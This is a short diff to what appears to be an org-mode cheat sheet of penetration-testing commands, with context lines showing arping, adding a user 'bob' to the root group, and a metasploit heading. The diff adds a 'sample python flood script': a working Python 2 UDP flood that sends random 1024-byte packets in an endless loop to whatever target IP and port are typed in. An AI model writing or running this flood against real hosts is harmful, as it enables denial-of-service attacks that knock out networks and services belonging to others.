@@ -220,6 +220,23 @@ $ arping [ip address]
  $ useradd –g root bob
  #+end_src 
 
+* sample python flood script
+
+#+begin_src python
+import socket
+import random
+
+sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes=random._urandom(1024)
+ip=raw_input('Target IP:')
+port=input('Port:')
+sent=0
+
+while 1:
+	sock.sendto(bytes,(ip,port))
+	print "Sent %s amount of packets to %s at port %s: " % (sent,ip, port)
+	sent = sent + 1
+#+end_src 
 
 * metasploit
 ** init
